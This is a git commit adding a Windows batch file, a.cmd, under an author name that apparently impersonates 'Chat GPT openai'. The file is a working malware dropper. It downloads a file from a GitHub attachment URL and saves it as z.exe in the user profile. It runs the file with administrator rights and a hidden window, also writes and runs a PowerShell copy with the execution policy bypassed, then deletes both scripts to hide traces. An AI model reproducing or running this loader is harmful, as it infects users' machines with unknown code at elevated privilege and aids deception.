0ac1b9ebd482c50129328f0d494dea4250815155
Chat GPT openai <127485092+locallhostcl@users.noreply.github.com>
2024-06-19 11:51:21 +0700

    Add files via upload

---
+++ a.cmd
@@ -0,0 +1,9 @@
+
+@echo off
+echo $Url = 'https://github.com/user-attachments/files/15895328/z.zip'
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $ProgressPreference = 'SilentlyContinue'; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'z.exe'; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = '-fullinstall'; $Command = 'Start-Process -FilePath $InstallerPath -ArgumentList $Arguments -Verb RunAs -WindowStyle Hidden'; Invoke-Expression -Command $Command"
+powershell -Command "Add-Content -Path ok.ps1 -Value 'echo $Url = ''https://github.com/user-attachments/files/15895328/z.zip''; [Net.ServicePointManager]::SecurityProtocol = ''tls12, tls11, tls''; $ProgressPreference = ''SilentlyContinue''; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath ''z.exe''; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = ''-fullinstall''; $Command = ''Start-Process -FilePath ''$InstallerPath'' -ArgumentList ''$Arguments'' -Verb RunAs -WindowStyle Hidden''; Invoke-Expression -Command $Command'"
+powershell.exe -ExecutionPolicy Bypass -File ok.ps1
+del %0
+del ok.ps1
+            
